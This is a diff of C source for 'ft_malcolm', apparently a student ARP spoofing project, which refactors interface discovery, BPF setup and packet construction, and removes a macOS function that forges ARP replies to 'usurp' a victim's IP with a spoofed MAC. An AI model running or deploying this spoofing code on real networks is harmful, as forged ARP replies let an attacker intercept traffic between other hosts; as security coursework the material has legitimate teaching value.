@@ -14,37 +14,6 @@ int	fillEtherPacket(struct ether_header *eth, struct ether_addr *src, struct eth
 }
 
 
-
-/*
-** Fill an ARP Packet with provided data
-*/
-int	fillArpPacketOsx(
-	struct ether_arp	*arphdr,
-	struct ether_addr	*srcMac,
-	struct ether_addr	*trgMac,
-	u_char *srcIp,
-	u_char *trgIp,
-	u_short arpType)
-{
-	if (!arphdr || !srcIp || !trgIp || !srcMac || !trgMac)
-		return EXIT_FAILURE;
-	/* fill ARP header */
-	arphdr->ea_hdr.ar_hrd	= htons(ARPHRD_ETHER);
-	arphdr->ea_hdr.ar_pro	= htons(ETHERTYPE_IP);
-	arphdr->ea_hdr.ar_hln	= ETHER_ADDR_LEN;
-	arphdr->ea_hdr.ar_pln	= IPV4_ADDR_LEN;
-	arphdr->ea_hdr.ar_op	= htons(arpType);
-
-	/* fill ARP values */
-	ft_memcpy(arphdr->arp_tha, srcMac, ETHER_ADDR_LEN);	/* Destination MAC that we bluff */ /* VM MAC */
-	ft_memcpy(arphdr->arp_tpa, srcIp, IPV4_ADDR_LEN);	/* Destination IP that we bluff */ /* VM IP */
-	ft_memcpy(arphdr->arp_spa, trgIp, IPV4_ADDR_LEN); 	/* IP that we usurpate */ /* box */
-	ft_memcpy(arphdr->arp_sha, trgMac, ETHER_ADDR_LEN);	/* spoffed addr (mine, not the real)*/
-	return EXIT_SUCCESS;
-}
-
-
-
 int	spoofArp(ft_malcolm *malc)
 {
 	size_t					packageSize = sizeof(struct ether_header) + sizeof(struct ether_arp);
@@ -66,17 +35,14 @@ int	spoofArp(ft_malcolm *malc)
 		return EXIT_FAILURE;
 
     dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n", 			malc->if_name,
-		localMac.octet[0],
-		localMac.octet[1],
-		localMac.octet[2],
-		localMac.octet[3],
-		localMac.octet[4],
-		localMac.octet[5]);
+		localMac.octet[0], localMac.octet[1],
+		localMac.octet[2], localMac.octet[3],
+		localMac.octet[4], localMac.octet[5]);
 
 	/* fill ethernet header */
 	fillEtherPacket(ethhdr, &localMac, &malc->srcMac, ETHERTYPE_ARP);
 	/* fill arp header */
-	fillArpPacketOsx(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);
+	fillArpPacket(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);
 
 	/* Send package */
 	char macBuf1[INET_ADDRSTRLEN];
@@ -87,62 +53,69 @@ int	spoofArp(ft_malcolm *malc)
 	ipToSockaddr(malc->srcIp, &sIpSrc);
 	ipToSockaddr(malc->targetIp, &sIpTarget);
 	dprintf(STDOUT_FILENO, "Sending reply to: %s at %s telling that %s is at %s\n",
-		get_ip_str(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
+		ipToStr(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
 		macToStr(&malc->srcMac, ipBuf1),
-		get_ip_str(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
+		ipToStr(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
 		macToStr(&malc->targetMac, ipBuf2));
 	dprintf(STDOUT_FILENO, "Sending frame with a size of: %lu \n", packageSize);
-	ret = write(malc->recv_socket, malc->msg, packageSize);
+	ret = write(malc->socket, malc->msg, packageSize);
 	dprintf(STDOUT_FILENO, "Size sended: %ld\n", ret);
 
 	return EXIT_SUCCESS;
 }
 
 
-int displayifs(ft_malcolm *malc, int all)
+int		getInterfaces(ft_malcolm *malc, int all)
 {
-	char buff[42];
-	if (!malc->all_ifs)
+	char			buff[42];
+	struct ifaddrs	*if_current;
+
+	if (getifaddrs(&if_current))
 	{
-		dprintf(STDERR_FILENO, "No interfaces found\n");
+		dprintf(STDOUT_FILENO, "Fail to fetch interfaces because of : %s\n", strerror(errno));
 		return EXIT_FAILURE;
 	}
-	dprintf(STDOUT_FILENO, "Interfaces:\n");
-	malc->used_ifs = malc->all_ifs;
-	while (malc->used_ifs)
+
+	dprintf(STDOUT_FILENO, "Interfaces found:\n");
+	malc->all_ifs = if_current;
+	while (if_current)
 	{
-		if (malc->used_ifs->ifa_addr->sa_family == AF_INET)
+		if (if_current->ifa_addr->sa_family == AF_INET)
 		{
-			if (!all && ft_strcmp(malc->used_ifs->ifa_name, "lo0"))
-			{
-				dprintf(STDOUT_FILENO, "%10s - %s - %s used\n", malc->used_ifs->ifa_name, "IPv4", get_ip_str(malc->used_ifs->ifa_addr, buff, 41));
-				return EXIT_SUCCESS;
-			}
-			else
-				dprintf(STDOUT_FILENO, "%10s - %s - %s\n", malc->used_ifs->ifa_name, (malc->used_ifs->ifa_addr->sa_family == AF_INET ? "IPv4" : "IPv6"), get_ip_str(malc->used_ifs->ifa_addr, buff, 41));
+			dprintf(STDOUT_FILENO, "%10s - %s - %s\n", if_current->ifa_name, (if_current->ifa_addr->sa_family == AF_INET ? "IPv4" : "IPv6"), ipToStr(if_current->ifa_addr, buff, 41));
+			if (!all && ft_strcmp(if_current->ifa_name, "lo0"))
+				malc->used_ifs = if_current;
 		}
-		malc->used_ifs = malc->used_ifs->ifa_next;
+		if_current=if_current->ifa_next;
 	}
+	dprintf(STDOUT_FILENO, "using [%s]\n", malc->used_ifs->ifa_name);
 	return EXIT_SUCCESS;
 }
 
+
 int init_connection(ft_malcolm * malc, char **av)
 {
-	memset(&malc->conn, 0, sizeof(struct sockaddr_in));
-	if (getifaddrs(&malc->all_ifs))
-		return EXIT_FAILURE;
+	ft_memset(&malc->conn, '\0', sizeof(struct sockaddr_in));
+
 	/* Get interface name */
-	displayifs(malc, 0);
+	getInterfaces(malc, 0);
 	ft_strncpy(malc->if_name, malc->used_ifs->ifa_name, IF_NAMESIZE);
 
 	/* Get IP of this interface */
 	ft_memcpy(malc->ownIP, malc->used_ifs->ifa_addr->sa_data, IPV4_ADDR_LEN);
 	
-	/* target MAC */
+	/* extract MAC  target 1*/
 	ft_capitalize(av[1]);
 	strToMac(&malc->srcMac, av[1]);
+	if (malc->verbose)
+		printMac(&malc->srcMac, "target1 MAC address:");
 	ft_capitalize(av[3]);
+
+	/* extract MAC  target 2*/
 	strToMac(&malc->targetMac, av[3]);
+	if (malc->verbose)
+		printMac(&malc->targetMac, "target2 MAC address:");
+
 	struct hostent *hps = gethostbyname(av[0]);
 	if (!hps)
 	{
@@ -171,8 +144,8 @@ int init_connection(ft_malcolm * malc, char **av)
 	ipToSockaddr(malc->srcIp, &malc->sockSrcIp);
 	ipToSockaddr(malc->targetIp, &malc->sockTargetIp);
 
-	dprintf(STDOUT_FILENO, "source IP: %s\n", get_ip_str(&malc->sockSrcIp, buf, INET_ADDRSTRLEN));
-	dprintf(STDOUT_FILENO, "target IP: %s\n", get_ip_str(&malc->sockTargetIp, buf, INET_ADDRSTRLEN));
+	dprintf(STDOUT_FILENO, "source IP: %s\n", ipToStr(&malc->sockSrcIp, buf, INET_ADDRSTRLEN));
+	dprintf(STDOUT_FILENO, "target IP: %s\n", ipToStr(&malc->sockTargetIp, buf, INET_ADDRSTRLEN));
 	
 
 	return EXIT_SUCCESS;
@@ -180,7 +153,8 @@ int init_connection(ft_malcolm * malc, char **av)
 
 int	clean_quit(ft_malcolm *malc)
 {
-	close(malc->recv_socket);
+	dprintf(STDOUT_FILENO, "Cleaning program...\n");
+	close(malc->socket);
 	freeifaddrs(malc->all_ifs);
 	return EXIT_SUCCESS;
 }
@@ -188,31 +162,14 @@ int	clean_quit(ft_malcolm *malc)
 
 int waitArpRequestOsx(ft_malcolm *malc)
 {
-	char buf[100];
-	for(int i = 0; i < 99; i++ )
-	{
-		sprintf( buf, "/dev/bpf%i", i );
-		malc->recv_socket = open( buf, O_RDWR );
-		if( malc->recv_socket != -1 ) {
-			printf("Opened device /dev/bpf%i\n", i);
-			break;
-		}
-	}
-	if (malc->recv_socket < 0)
-	{
-		dprintf(STDERR_FILENO, "Failed to open bpf: %s\n", strerror(errno));
+	if (openBpfFile(&malc->socket, STDOUT_FILENO, malc->verbose)
+		|| bpfSetOption(malc)
+		|| bpfCheckDlt(malc)
+		|| bpfSetFilter(malc))
 		return EXIT_FAILURE;
-	}
-	if (bpfSetOption(malc->recv_socket, malc->if_name))
-		return EXIT_FAILURE;
-	else if (bpfCheckDlt(malc->recv_socket))
-		return EXIT_FAILURE;
-	else if (bpfSetFilter(malc->recv_socket))
-		return EXIT_FAILURE;
-	else if (read_packets(malc))
+	if (read_packets(malc))
 		return EXIT_FAILURE;
 	dprintf(STDOUT_FILENO, "Now get ready to send an ARP reply\n");
-
 	return EXIT_SUCCESS;
 }
 
@@ -221,7 +178,7 @@ int parsing_arguments(int ac, char **av, ft_malcolm *malc)
 	char buf[4096];
 	if (ft_strlen(av[0]) > 4000)
 		av[0][4000] = '\0';
-	buf[sprintf(buf, "%s [options] [--] usurped_ip local_mac target_ip target_mac_address", av[0])] = '\0';
+	buf[sprintf(buf, "%s [options] [--] target1_ip target1_mac target2_ip target2_mac", av[0])] = '\0';
 	const char *const usages[] = {
     	buf,
     	NULL,
@@ -235,11 +192,9 @@ int parsing_arguments(int ac, char **av, ft_malcolm *malc)
         OPT_END(),
     };
 	struct argparse argparse;
-	dprintf(1, "ac=%d\n", ac);
     argparse_init(&argparse, options, usages, 0);
     argparse_describe(&argparse, "\nARP spoofing (poisoning) program.", "\nAdditional description of the program after the description of the arguments.");
     ac = argparse_parse(&argparse, ac, (const char**)av);
-	dprintf(1, "ac=%d\n", ac);
 	if (ac < 4)
 	{
 		argparse_usage(&argparse);
@@ -256,6 +211,7 @@ int main(int ac, char **av)
 		return EXIT_FAILURE;
 	if (init_connection(&malc, av))
 		return EXIT_FAILURE;
+	dprintf(STDOUT_FILENO, "Verbose mode %s.\n", (malc.verbose) ? "enabled" : "disabled");
 # ifdef LINUX
 	if (waitArpRequest(&malc))
 		return EXIT_FAILURE;
@@ -265,8 +221,8 @@ int main(int ac, char **av)
 			return EXIT_FAILURE;
 
 		/* Tell target that we are source */
-			spoofArp(&malc);
-		close(malc.recv_socket);
+			// spoofArp(&malc);
+		close(malc.socket);
 	}
 # endif
 	if (clean_quit(&malc))
